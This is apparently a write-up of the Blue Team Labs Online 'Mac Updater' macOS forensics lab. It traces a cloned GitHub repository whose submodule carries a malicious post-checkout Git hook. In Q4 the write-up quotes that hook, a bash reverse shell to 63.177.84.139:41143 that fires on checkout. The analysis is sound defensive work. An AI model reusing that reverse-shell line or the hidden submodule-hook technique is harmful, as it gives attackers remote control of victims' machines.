# 🚨 Mac Updater Investigation

---

## 🎯 Objective
Conduct a macOS-focused digital forensic investigation following a SIEM alert related to a suspicious crashed process on an employee workstation. Analyze system artifacts, persistence mechanisms, and indicators of compromise to determine whether the host was compromised.

---

## 🧾 Lab Details
- **Platform:** Blue Team Labs Online (BTLO)  
- **Lab:** Mac Updater  
 - **Difficulty:** Medium  
- **OS:** macOS  
- **Category:** Digital Forensics And Incident Response  

---

## 📖 Scenario
During a routine monitoring operation, the SOC team received a SIEM alert indicating that an unknown process unexpectedly crashed on Khaled Allam’s MacBook, part of the EZ-CERT network.

When questioned, Khaled denied any knowledge of the process or its origin. The incident prompted a rapid triage of the device to identify potential indicators of compromise, persistence mechanisms, or suspicious activity.

The objective of the investigation was to determine whether the system had been compromised and ensure no malicious artifacts remained on the host.

---

## 🛠️ Tools Used
- UnifiedLogReader  
- Spotlight Parser  
- SQLite3  
- MRU Parser  
- FSE Parser  

---

## 🔎 Investigation Overview
The investigation focused on identifying suspicious activity on the macOS system, tracing potentially malicious repositories, analyzing persistence mechanisms, and uncovering command-and-control communication.

By correlating Spotlight artifacts, Git repositories, filesystem activity, and script analysis, it was possible to reconstruct the attack chain and identify the malicious behavior executed on the host.

---

## Lab Discovery

In this lab, we are analyzing a macOS system following a SIEM alert related to an unknown crashed process.

The investigation focuses on identifying suspicious repositories cloned on the system, tracing malicious code execution, identifying command-and-control communication, and determining whether persistence mechanisms were established.

---

## 🔍 Investigation Process

In most macOS DFIR investigations, I usually start by parsing the Unified Logs, FSEvents, Spotlight databases, and MRU artifacts to prepare them for analysis.

### Commands used for parsing:

```bash
.\unifiedlog_iterator.exe --mode log-archive --input "C:\Users\BTLOTest\Desktop\Artefacts\EZ-CERT_20251027_120253\EZ-CERT-Triage\UnifiedLogs\EZ-CERT_20251027_120253.logarchive" --format csv --output logs.csv
python3 FSEParser_V4.1.py -s "/mnt/c/Users/BTLOTest/Desktop/Artefacts/EZ-CERT_20251027_120253/EZ-CERT-Triage/fsevents/.fseventsd" -o "/mnt/c/Users/BTLOTest/Desktop/FSE_Output" -t folder
python2 macMRU.py "/mnt/c/Users/BTLOTest/Desktop/Artefacts/EZ-CERT_20251027_120253/EZ-CERT-Triage/Users/khaled.allam/Library/Application-Support/com.apple.sharedfilelist" --blob_parse_human > Output.txt
python3 spotlight_parser.py "/mnt/c/Users/BTLOTest/Desktop/Artefacts/EZ-CERT_20251027_120253/EZ-CERT-Triage/spotlight/.Spotlight-V100/Store-V2/C0DFC1E3-3C5F-4980-8054-0BF40FCF0308/.store.db" "/mnt/c/Users/BTLOTest/Desktop/spot/"
```

Q1) While reviewing Khaled’s workspace, you discover he cloned a GitHub repository that appears tied to his workflow. What is the repository’s full URL?

For the first question, I usually start by checking command history to identify recently executed commands and suspicious activity.
However, during the investigation, I found a useful lead inside the spotlight-store_data.txt file after searching for the keyword:
***clone***
This revealed a GitHub cloning command along with the repository URL, as shown below:

***Workflow Tools??Small collection of helper scripts and utilities used to prepare a workspace, package artifacts, and generate simple reports. Intended for onboarding and light automation tasks.??## Quick start??```bash??# clone repo??git clone --recursive https://github.com/AbuTrikaa/workflow-tools***

From this artifact, I identified the repository cloned on the system.

<img width="1545" height="806" alt="Mac Updater-Q1" src="https://github.com/user-attachments/assets/17bee7bb-66e4-4f8f-af3f-6e2b99b6cca7" />

***Answer ==> https://github.com/AbuTrikaa/workflow-tools***

Q2) When exactly did Khaled (or whoever used his account) clone that repository?

From the repository URL discovered in the previous question, I identified the repository name:
***workflow-tools**

I then searched for this keyword within the same spotlight-store_data.txt file and found metadata entries related to the cloned repository.
The following values revealed the repository creation timestamp:

_kMDItemDisplayNameWithExtensions --> workflow-tools

kMDItemContentCreationDate --> 2025-10-27 18:25:18.702052

This timestamp indicates when the repository was cloned onto the system.

<img width="1545" height="807" alt="Mac Updater-Q2" src="https://github.com/user-attachments/assets/9ac2620c-1e93-4977-b1c3-d164f35d2607" />


***Answer ==> 2025-10-27 18:25:18.702***

Q3) The cloned repository references another repository that actually hosts the malicious code. What is the full URL of that external repository?

To continue the investigation, I navigated to the cloned repository directory located at:

\Users\khaled.allam\Downloads\workflow-tools

Inside the repository, I reviewed the .gitmodules file to check whether any external repositories or submodules were referenced.

There, I found the following URL:

***url = https://github.com/NotMoSala/TotallyNormal.git***

This confirmed that the repository was linked to another GitHub repository hosting the malicious code.

<img width="1548" height="842" alt="Mac Updater-Q3" src="https://github.com/user-attachments/assets/4e602f2e-f5b3-4a35-9bc5-aaa868d13b21" />


Answer ==> https://github.com/NotMoSala/TotallyNormal

Q4) Right after the repository was cloned, the host reached back to a remote command-and-control server. Provide the IP and port of that C2.


Since the TotallyNormal repository appeared to contain the malicious functionality, I continued analyzing its contents for suspicious scripts and execution behavior.
During the review, I found a malicious post-checkout Git hook containing a reverse shell command:

```bash
#!/usr/bin/env bash
touch /tmp/khaled
/bin/bash -c bash -i >& /dev/tcp/63.177.84.139/41143 0>&1***
```
This command establishes a reverse shell connection to a remote command-and-control server.

From the script, I identified the following C2 IP address and port:

<img width="1913" height="982" alt="Mac Updater-Q4" src="https://github.com/user-attachments/assets/0de72598-12ab-48c0-8767-1125d63edddc" />


Answer ==> 63.177.84.139:41143
